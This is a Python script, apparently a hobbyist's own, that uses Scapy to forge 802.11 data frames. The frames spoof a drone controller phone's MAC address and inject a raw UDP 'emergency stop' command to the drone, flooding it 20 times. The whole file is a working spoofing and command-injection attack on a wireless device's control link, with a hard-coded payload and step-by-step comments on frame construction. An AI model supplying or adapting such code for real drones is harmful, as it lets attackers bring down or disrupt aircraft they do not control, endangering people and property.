# This script sends a emergency stop packet to the drone pretending to be the original controller (my phone).
# It requires the Scapy Python package and the specified WiFi interface (wlan0mon) to be in monitor mode for packet injection.
# Version 1.0, 24/10/25, Roadbobek, <3

import time
import binascii
from scapy.all import sendp, Dot11, RadioTap, IP, UDP

# --- Configuration ---
# Replace these with the actual MAC addresses observed in your Wireshark capture
CONTROLLER_MAC = "CA:A9:96:5B:50:05" # MAC of the legit controller phone (Source MAC)
DRONE_MAC = "C4:D7:FD:0E:F3:6D"      # MAC of the drone (Destination MAC)
DRONE_IP = '192.168.169.1'           # Drone's IP (Destination IP)
DRONE_PORT = 8800

# Your STOP command payload (raw bytes)
STOP_RAW_BYTES = binascii.unhexlify(
    "ef0258000202000100000000d7000000140066148080808002020000000000000000000000990000000000000000000000000000000000000000000000000000000000000000000000324b142d0000"
)

# ----------------------------------------

def inject_udp_command(interface):
    print(f"--- Injecting Packet onto {interface} as Controller {CONTROLLER_MAC} ---")
    
    # 1. Build the Packet Stack (Bottom-Up)
    
    # A. UDP/IP Payload (Layer 4/3) - The actual command
    # NOTE: The Source IP is irrelevant here; only the Source MAC matters to the WAP
    udp_packet = IP(src="192.168.169.2", dst=DRONE_IP) / \
                 UDP(sport=59377, dport=DRONE_PORT) / \
                 STOP_RAW_BYTES

    # B. 802.11 Frame (Layer 2) - This is where the magic happens
    # addr2 (Source MAC) MUST be the legit controller's MAC
    # addr1 (Destination MAC) MUST be the drone's MAC
    # addr3 (BSSID) MUST be the drone's MAC
    dot11_frame = Dot11(
        addr1=DRONE_MAC, 
        addr2=CONTROLLER_MAC, 
        addr3=DRONE_MAC,
        # Type 2, Subtype 0x20 is typically a Data frame
        type=2, 
        subtype=0 # Subtype 0 is Data, adjust if needed (e.g., 8 is QoS Data)
    )

    # C. RadioTap Header (Layer 1) - Required for monitor mode injection
    # Combines the 802.11 frame and the UDP payload
    injection_packet = RadioTap() / dot11_frame / udp_packet

    # 2. Injection Loop (Flood the Command)
    try:
        count = 0
        while count < 20: # Send 20 times for reliability
            sendp(injection_packet, iface=interface, verbose=False)
            print(f"Injected STOP command packet {count + 1}/20.")
            count += 1
            time.sleep(0.01) # Send at 100Hz
            
    except Exception as e:
        print(f"\nError during packet injection. Ensure Scapy is installed, the interface is in monitor mode, and you have root/sudo privileges.")
        print(f"Details: {e}")

if __name__ == "__main__":
    # REPLACE 'wlan0mon' with your monitor interface name (e.g., mon0, wlan1mon)
    monitor_interface = "wlan0mon" 
    inject_udp_command(monitor_interface)